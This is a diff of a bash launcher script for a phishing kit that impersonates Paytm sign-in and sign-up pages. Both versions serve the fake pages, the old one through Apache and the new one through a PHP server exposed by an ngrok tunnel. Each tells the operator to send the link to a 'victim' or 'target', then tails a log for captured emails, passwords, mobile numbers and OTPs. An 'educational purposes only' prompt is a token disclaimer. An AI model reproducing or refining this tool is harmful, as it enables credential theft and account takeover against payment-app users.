@@ -1,94 +1,80 @@
-#!/bin/bash 
- cat Launch.txt
-sleep 4
- echo -e "\e[1;33m REQUIREMENT : ROOT! INTERNET! APACHE SERVER! \e[0m" 
- echo -e "\e[1;37m                   Devolopers assume no liability and are not Responsible! \e[0m"
+#!/bin/bash
+clear
+echo ""
+echo ""
+echo ""
+printf "\e[1;33m[\e[0m <<>> \e[1;33m] NGROK SERVER : TURN ON MOBILE DATA & HOTSPOT AND GET START !\e[0m"
 sleep 6
-# spinner
-spinlong ()
-{
-   bar=" +++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
-   barlenght=${#bar}
-   i=o
-   while ((i < 100 )); do
-	   n=$((i*barlenght / 100 ))
-	   printf "\e[00;32m\r[%-${barlenght}s]\e[00m" "${bar:0:n}"
-	   ((i += RANDOM%5+2))
-	   sleep 0.4
-   done
-}
+echo ""
+clear
+echo ""
+echo ""
+echo ""
+read -p $'\e[1;32m\e[0m\e[1;32mT H I S - T O O L - F O R - E D U C A T I O N A l - P U R P O S E S - O N L Y ? \e[1;33m\e[0m\e[1;33m (Y/N) : \e[0m' option
+echo""
+echo""
+echo""
 
+if [[ $option == *'N'* ]]; then
+clear
+exit
+fi
+if [[ $option == *'n'* ]]; then
+clear
+exit
+fi
 
-#clolors
-white='\e[1;37m'
-green='\e[0;32m'
-blue='\e[1;34m'
-red='\e[1;31m'
-yellow='\e[1;33m' 
-printf "        \e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Paytm\e[0m\n"
+php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
+ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
+kill -9 $php
+kill -9 $ngrok
+clear
+chmod 777 Logo.sh
+./Logo.sh
 
-           echo -e $green "Enter Ngrok Path (ex. /root/)"
-           read $Path
-           echo -e $white "(1) Paytm Signin"
-	   echo -e $white "(2) Paytm Signup"
-		 echo -e $yellow "Enter your option"
-		 read option
-		 case $option in 
-			 1) sudo apt-get install apache2
-		            hostnamectl
-		systemctl start apache2
-		apt install xterm
-		apt install gnome-terminal
-		systemctl restart apache2.service
-		mkdir /var
-		mkdir /var/www
-		mkdir /var/www/html
-		mv /var/www/html/* /var/www/
-		rm -rf /var/www/html/*
-		cd paytm/
-		cp -R * /var/www/html/
-		cd ..
-		cd /var/www/html/
-		chmod +x *
-		chmod 7777 *
-		sleep 6
-		
-		
-		printf "                                \e[210m\e[1;99m ALERT +++++++++++++++++++++ Step 1 - Send Https Link on Victim +++++++++++ \e[0m\n"
-		printf "                                \e[210m\e[1;99m ALERT +++++++++++++++++++++ Step 2 - All Password save on /var/www/html/log.txt ++++++++++++++ \e[0m\n"
-		sleep 11
-		cd $Path
-                gnome-terminal -x bash -c "./ngrok http 80; exec bash"
-                cd /var/www/html/
-		gnome-terminal -x bash -c "tail -f log.txt | grep -e "email" -e "username" -e "password"; exec bash"
-                gnome-terminal -x bash -c "tail -f logs.txt | grep -e "otp"; exec bash"
-		;;
-	        2) sudo apt-get install apache2
-		hostnamectl
-		systemctl start apache2
-		apt install xterm
-		apt install gnome-terminal
-		systemctl restart apache2.service
-		mkdir /var
-		mkdir /var/www
-		mkdir /var/www/html
-		mv /var/www/html/* /var/www/
-		rm -rf /var/www/html/*
-		cd signup/
-		cp -R * /var/www/html/
-		cd ..
-		cd /var/www/html/
-		chmod +x *
-		chmod 7777 *
-		sleep 6
-		printf "                                                     \e[210m\e[1;99m ALERT ++++++++++++++++++++ Step 1 - Send Https Link on Victim +++++++++++++ \e[0m\n"
-		printf "                                                     \e[210m\e[1;99m ALERT ++++++++++++++++++++ Step 2 - All Password Sve on /var/www/html/log.txt ++++++++++++++ \e[0m\n"
-		sleep 11
-		cd $Path
-                gnome-terminal -x bash -c "./ngrok http 80; exec bash"
-                cd /var/www/html/
-		gnome-terminal -x bash -c "tail -f log.txt | grep -e "email" -e "username" -e "password"; exec bash"
-                gnome-terminal -x bash -c "tail -f logs.txt | grep -e "email" -e "otp"; exec bash"
-		;;
+echo ""
+echo ""
+
+                 echo -e $'\e[1;33m[\e[0m\e[1;77m 1 \e[0m\e[1;33m]\e[0m\e[1;32m Paytm Sign In \e[0m' 
+                 echo -e $'\e[1;33m[\e[0m\e[1;77m 2 \e[0m\e[1;33m]\e[0m\e[1;32m Paytm Sign UP \e[0m' 
+                 echo ""
+                 read -p $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m Enter Your Choice : \e[0m' option
+		 case $option in
+			 1) cd paytm/
+                            echo ""
+                            echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
+                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+                            sleep 3
+                            echo ""
+                            echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
+                            ./ngrok http 4444 > /dev/null 2>&1 &
+                            sleep 25
+                            echo ""
+                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+                            printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
+                            echo ""
+                            echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
+                            echo ""
+                            tail -f log.txt | grep -e "email" -e "username" -e "password" -e "otp"
+
+                ;;
+                
+                         2) cd signup/
+                            echo ""
+                            echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
+                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+                            sleep 3
+                            echo ""
+                            echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
+                            ./ngrok http 4444 > /dev/null 2>&1 &
+                            sleep 25
+                            echo ""
+                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+                            printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
+                            echo ""
+                            echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
+                            echo ""
+                            tail -f log.txt | grep -e "email" -e "loginPassword" -e "mobileNumber" -e "otp"
+                ;;
                 esac
                 ;;
